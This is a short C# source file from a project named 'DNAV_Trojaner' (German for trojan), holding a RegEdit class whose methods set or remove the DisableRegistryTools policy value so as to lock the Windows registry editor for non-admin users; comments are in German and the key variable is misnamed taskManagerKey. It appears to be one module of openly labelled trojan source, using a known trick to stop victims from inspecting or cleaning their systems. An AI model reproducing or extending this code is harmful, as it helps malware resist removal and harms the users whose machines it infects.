using Microsoft.Win32;

namespace DNAV_Trojaner
{
    public class RegEdit
    {
        /// <summary>
        /// Aktiviert den Registrierungseditor
        /// </summary>
        public static void Enable()
        {
            RegistryKey taskManagerKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (taskManagerKey.GetValue("DisableRegistryTools") != null)
            {
                taskManagerKey.DeleteValue("DisableRegistryTools");
            }
        }

        /// <summary>
        /// Deaktiviert den Registrierungseditor. Gilt nur für nicht-Admin Benutzer
        /// </summary>
        public static void Disable()
        {
            RegistryKey taskManagerKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            taskManagerKey.SetValue("DisableRegistryTools", "1");
            taskManagerKey.Close();
        }
    }
}
